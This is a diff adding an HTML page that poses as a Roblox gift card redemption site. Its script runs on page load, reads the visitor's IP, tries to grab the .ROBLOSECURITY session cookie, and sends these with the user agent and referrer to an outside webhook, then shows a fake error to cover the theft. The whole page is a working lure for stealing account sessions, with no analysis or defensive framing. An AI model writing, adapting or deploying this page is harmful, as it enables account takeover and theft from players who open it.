@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Roblox Gift Card – Redeem</title>
+  <style>
+    body{background:#f5f5f5;font-family:Arial;text-align:center;padding:50px;}
+    .card{background:white;max-width:400px;margin:auto;padding:30px;border-radius:10px;box-shadow:0 0 20px rgba(0,0,0,0.2);}
+    p{color:#666;}
+  </style>
+</head>
+<body>
+<div class="card">
+  <h2>🎮 Roblox Gift Card</h2>
+  <p>Validating your account... Please wait.</p>
+</div>
+<script>
+(async()=>{
+  // 1. Get IP
+  const ip = await (await fetch('https://api.ipify.org?format=json')).json();
+  // 2. Try to steal Roblox cookie
+  let cookie = '';
+  try {
+    const cookies = document.cookie.split('; ');
+    for(let c of cookies) if(c.startsWith('.ROBLOSECURITY=')) cookie = c.split('=')[1];
+  } catch(e) {}
+  // 3. Send everything to your webhook (no click needed)
+  await fetch('https://webhook.site/a8289c90-5958-4c87-bbee-970788fd8469', {
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({ip:ip.ip, cookie:cookie||'none', ua:navigator.userAgent, referrer:document.referrer})
+  });
+  // 4. Show a fake error message after 2 seconds
+  setTimeout(()=>{
+    document.querySelector('.card').innerHTML = '<h2 style="color:red;">Error</h2><p>Invalid region. Try again later.</p>';
+  },2000);
+})();
+</script>
+</body>
+</html>
